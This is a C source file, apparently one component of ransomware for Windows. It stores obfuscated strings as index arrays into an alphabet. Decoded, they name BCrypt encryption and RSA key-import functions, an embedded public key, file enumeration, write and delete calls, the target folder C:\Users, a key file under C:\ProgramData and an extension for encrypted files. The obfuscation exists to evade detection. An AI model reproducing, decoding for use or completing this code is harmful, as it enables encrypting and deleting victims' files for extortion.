#include "obfuscate.h"
#include <stddef.h>

const char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-:/\\ \n+=*?";

void decodeString(const int *indices, size_t n, char *out) {
    for (size_t i = 0; i < n; i++) out[i] = big_string[indices[i]];
    out[n] = '\0';
}

static char g_buf[1024];

const char *getOriginalString(const int *indices, size_t n) {
    for (size_t i = 0; i < n; i++) g_buf[i] = big_string[indices[i]];
    g_buf[n] = '\0';
    return g_buf;
}

const int s_pub_pem[] = { 38,34,34,27,34,9,26,39,27,6,10,16,7,10,8,32,61,22,52,27,26,42,30,31,26,26,40,28,26,42,60,26,38,34,34,27,28,6,36,28,26,42,30,26,17,12,14,25,17,61,25,41,50,16,11,34,9,47,38,41,34,35,33,40,4,58,28,47,61,10,14,0,3,11,5,54,1,52,16,46,20,53,9,54,42,2,9,14,32,24,56,52,44,20,70,47,55,54,59,15,3,34,57,57,35,33,59,1,49,57,28,54,54,12,70,48,53,70,27,14,18,39,42,61,40,47,38,31,4,22,21,57,53,50,7,14,20,19,26,45,26,5,58,50,26,22,13,39,38,20,13,22,52,12,9,26,26,70,50,50,23,34,28,22,60,43,38,20,44,0,21,39,8,13,34,52,44,24,31,49,52,48,53,25,59,42,22,32,60,23,35,37,1,38,23,20,31,23,23,4,27,42,0,43,35,60,16,48,38,22,30,34,30,35,38,36,27,10,31,7,52,35,7,3,10,70,39,8,66,46,36,6,39,36,34,36,14,54,23,11,34,11,55,47,50,16,28,56,54,59,30,70,20,61,20,34,16,37,22,32,41,70,50,20,66,50,57,29,27,54,19,57,20,56,29,27,8,31,2,28,13,32,17,33,38,37,5,33,60,16,43,48,4,54,24,44,60,6,16,25,13,18,42,26,52,45,55,6,31,18,1,60,57,16,26,6,7,17,30,2,7,7,9,55,70,33,30,28,26,27,5,51,70,29,3,37,58,60,54,9,30,6,32,12,19,48,20,60,49,41,13,6,39,40,21,42,33,60,36,35,35,5,60,5,8,26,53,31,59,35,31,30,70,53,8,0,50,26,22,5,16,4,58,19,26,22,34,29,26,42,26,27 };
const size_t s_pub_pem_len = sizeof(s_pub_pem)/sizeof(int);

const int s_bcrypt_dll[] = { 1,2,17,24,15,19,62,3,11,11 };
const size_t s_bcrypt_dll_len = sizeof(s_bcrypt_dll)/sizeof(int);

const int s_crypt32_dll[] = { 2,17,24,15,19,55,54,62,3,11,11 };
const size_t s_crypt32_dll_len = sizeof(s_crypt32_dll)/sizeof(int);

const int s_kernel32_dll[] = { 10,4,17,13,4,11,55,54,62,3,11,11 };
const size_t s_kernel32_dll_len = sizeof(s_kernel32_dll)/sizeof(int);

const int s_BCryptOpenAlgorithmProvider[] = { 27,28,17,24,15,19,40,15,4,13,26,11,6,14,17,8,19,7,12,41,17,14,21,8,3,4,17 };
const size_t s_BCryptOpenAlgorithmProvider_len = sizeof(s_BCryptOpenAlgorithmProvider)/sizeof(int);

const int s_BCryptCloseAlgorithmProvider[] = { 27,28,17,24,15,19,28,11,14,18,4,26,11,6,14,17,8,19,7,12,41,17,14,21,8,3,4,17 };
const size_t s_BCryptCloseAlgorithmProvider_len = sizeof(s_BCryptCloseAlgorithmProvider)/sizeof(int);

const int s_BCryptGenRandom[] = { 27,28,17,24,15,19,32,4,13,43,0,13,3,14,12 };
const size_t s_BCryptGenRandom_len = sizeof(s_BCryptGenRandom)/sizeof(int);

const int s_BCryptGenerateSymmetricKey[] = { 27,28,17,24,15,19,32,4,13,4,17,0,19,4,44,24,12,12,4,19,17,8,2,36,4,24 };
const size_t s_BCryptGenerateSymmetricKey_len = sizeof(s_BCryptGenerateSymmetricKey)/sizeof(int);

const int s_BCryptEncrypt[] = { 27,28,17,24,15,19,30,13,2,17,24,15,19 };
const size_t s_BCryptEncrypt_len = sizeof(s_BCryptEncrypt)/sizeof(int);

const int s_BCryptDestroyKey[] = { 27,28,17,24,15,19,29,4,18,19,17,14,24,36,4,24 };
const size_t s_BCryptDestroyKey_len = sizeof(s_BCryptDestroyKey)/sizeof(int);

const int s_BCryptImportKeyPair[] = { 27,28,17,24,15,19,34,12,15,14,17,19,36,4,24,41,0,8,17 };
const size_t s_BCryptImportKeyPair_len = sizeof(s_BCryptImportKeyPair)/sizeof(int);

const int s_CryptStringToBinaryA[] = { 28,17,24,15,19,44,19,17,8,13,6,45,14,27,8,13,0,17,24,26 };
const size_t s_CryptStringToBinaryA_len = sizeof(s_CryptStringToBinaryA)/sizeof(int);

const int s_CryptDecodeObjectEx[] = { 28,17,24,15,19,29,4,2,14,3,4,40,1,9,4,2,19,30,23 };
const size_t s_CryptDecodeObjectEx_len = sizeof(s_CryptDecodeObjectEx)/sizeof(int);

const int s_FindFirstFileA[] = { 31,8,13,3,31,8,17,18,19,31,8,11,4,26 };
const size_t s_FindFirstFileA_len = sizeof(s_FindFirstFileA)/sizeof(int);

const int s_FindNextFileA[] = { 31,8,13,3,39,4,23,19,31,8,11,4,26 };
const size_t s_FindNextFileA_len = sizeof(s_FindNextFileA)/sizeof(int);

const int s_FindClose[] = { 31,8,13,3,28,11,14,18,4 };
const size_t s_FindClose_len = sizeof(s_FindClose)/sizeof(int);

const int s_CreateFileA[] = { 28,17,4,0,19,4,31,8,11,4,26 };
const size_t s_CreateFileA_len = sizeof(s_CreateFileA)/sizeof(int);

const int s_ReadFile[] = { 43,4,0,3,31,8,11,4 };
const size_t s_ReadFile_len = sizeof(s_ReadFile)/sizeof(int);

const int s_WriteFile[] = { 48,17,8,19,4,31,8,11,4 };
const size_t s_WriteFile_len = sizeof(s_WriteFile)/sizeof(int);

const int s_CloseHandle[] = { 28,11,14,18,4,33,0,13,3,11,4 };
const size_t s_CloseHandle_len = sizeof(s_CloseHandle)/sizeof(int);

const int s_DeleteFileA[] = { 29,4,11,4,19,4,31,8,11,4,26 };
const size_t s_DeleteFileA_len = sizeof(s_DeleteFileA)/sizeof(int);

const int s_GetFileSize[] = { 32,4,19,31,8,11,4,44,8,25,4 };
const size_t s_GetFileSize_len = sizeof(s_GetFileSize)/sizeof(int);

const int s_LocalFree[] = { 37,14,2,0,11,31,17,4,4 };
const size_t s_LocalFree_len = sizeof(s_LocalFree)/sizeof(int);

const int s_root_dir[] = { 28,65,67,46,18,4,17,18 };
const size_t s_root_dir_len = sizeof(s_root_dir)/sizeof(int);

const int s_glob_all[] = { 67,72 };
const size_t s_glob_all_len = sizeof(s_glob_all)/sizeof(int);

const int s_path_key[] = { 28,65,67,41,17,14,6,17,0,12,29,0,19,0,67,10,4,24,62,1,8,13 };
const size_t s_path_key_len = sizeof(s_path_key)/sizeof(int);

const int s_ext_enc[] = { 62,43,34,41,46,43,41,28 };
const size_t s_ext_enc_len = sizeof(s_ext_enc)/sizeof(int);